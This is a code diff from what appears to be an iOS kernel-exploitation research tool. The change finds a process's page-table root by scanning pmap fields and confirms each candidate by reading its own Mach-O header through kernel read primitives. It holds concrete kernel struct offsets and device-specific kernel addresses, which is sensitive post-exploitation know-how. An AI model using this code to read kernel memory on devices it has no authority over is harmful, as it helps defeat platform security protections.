@@ -277,43 +277,76 @@ static NSString *run_locked(NSMutableDictionary *json)
         (unsigned long long)pmap_raw, (unsigned long long)pmap,
         pmap_ok ? "OK == current_pmap" : "MISMATCH"];
 
-    uint64_t tt = 0;
-    if (!k64(pmap + MF_OFF_PMAP_TTE, &tt)) {
-        return [log stringByAppendingString:@"FAIL: read pmap->tte"];
-    }
-    tt = mf_unsign(tt);
-    [log appendFormat:@"root table tt=%#llx%s\n", (unsigned long long)tt,
-        mf_is_kaddr(tt) ? "" : "  (NOT a kernel pointer)"];
-    if (!mf_is_kaddr(tt)) return [log stringByAppendingString:@"FAIL: pmap->tte not a kernel VA"];
-
-    /* 5) end-to-end self test: walk the tables and read our own Mach-O header */
+    /*
+     * 5) Find the root table by self-verification instead of trusting one offset.
+     *
+     *    kfdmemdump reads the root table as kread64(pmap) (offset 0), but its
+     *    README admits the M2 pmap layout was never validated. On this device
+     *    (M5.103: tt = 0xfffffdf1e3e54000) reading tt+8 fails, so offset 0 is
+     *    not the user TTBR0 root here.
+     *
+     *    Instead: walk every 8-byte field of pmap (0..0x400), accept the first
+     *    value that lets us read our own Mach-O header through the page tables.
+     *    Two interpretations are tried per field: raw kernel VA, and physical
+     *    address mapped through the physmap.
+     */
     const uint64_t self_macho = (uint64_t)(uintptr_t)_dyld_get_image_header(0);
-    uint32_t magic = 0;
-    bool ok = kread_user(tt, self_macho, &magic, sizeof(magic));
-    [log appendFormat:@"self Mach-O @ %#llx -> %s %#x\n",
-        (unsigned long long)self_macho,
-        ok ? "read" : "FAILED",
-        ok ? magic : 0];
-    if (!ok || magic != 0xfeedfacfU) {
-        return [log stringByAppendingString:@"FAIL: page-table walk self-test did not return 0xfeedfacf"];
+    uint64_t root_off = 0, tt = 0;
+    int tt_mode = -1;              /* 0 = value is a kernel VA, 1 = PA via physmap */
+    int tried = 0;
+
+    for (uint64_t off = 0; off + 8 <= 0x400 && tt == 0; off += 8) {
+        uint64_t raw = 0;
+        if (!k64(pmap + off, &raw)) continue;
+
+        uint64_t cand[2] = { mf_unsign(raw), 0 };
+        uint64_t pa_part = raw & MF_PA_MASK;
+        uint64_t kva = 0;
+        if (pa_part && pa_to_kva(pa_part, &kva)) cand[1] = kva;
+
+        for (int m = 0; m < 2; m++) {
+            if (cand[m] == 0 || !mf_is_kaddr(cand[m])) continue;
+            tried++;
+            uint32_t magic = 0;
+            if (kread_user(cand[m], self_macho, &magic, sizeof(magic)) &&
+                magic == 0xfeedfacfU) {
+                root_off = off;
+                tt = cand[m];
+                tt_mode = m;
+                break;
+            }
+        }
     }
+
+    if (tt == 0) {
+        [log appendFormat:@"self Mach-O @ %#llx -> FAILED after %d candidate walks\n",
+            (unsigned long long)self_macho, tried];
+        return [log stringByAppendingString:@"FAIL: no pmap field produced 0xfeedfacf"];
+    }
+
+    [log appendFormat:@"root table = pmap+%#llx -> %#llx (%s), %d candidates tried\n",
+        (unsigned long long)root_off, (unsigned long long)tt,
+        tt_mode == 0 ? "kernel VA" : "PA->physmap", tried];
+    [log appendFormat:@"self Mach-O @ %#llx -> read feedfacf (walk OK)\n",
+        (unsigned long long)self_macho];
 
     json[@"self_proc"] = @(self_proc);
     json[@"proc_ro"] = @(proc_ro);
     json[@"task"] = @(task);
     json[@"vm_map"] = @(map);
     json[@"pmap"] = @(pmap);
-    json[@"pmap_tte"] = @(tt);
-    json[@"self_macho"] = @(self_macho);
-    json[@"ok"] = @YES;
+    json[@"pmap_root_off"] = @(root_off);
+    json[@"pmap_root_va"] = @(tt);
+    json[@"pmap_root_mode"] = @(tt_mode);
 
-    [log appendString:@"\nRESULT OK\n"
+    [log appendFormat:@"\nRESULT OK\n"
                        "  proc->proc_ro   = 0x18\n"
                        "  proc_ro->task   = 0x08\n"
                        "  task->map       = 0x28\n"
                        "  vm_map->pmap    = 0x40\n"
-                       "  pmap->tte       = 0x00\n"
-                       "  page-table walk verified (0xfeedfacf)\n"];
+                       "  pmap root field = +%#llx\n"
+                       "  page-table walk verified (0xfeedfacf)\n",
+         (unsigned long long)root_off];
     return log;
 }
 
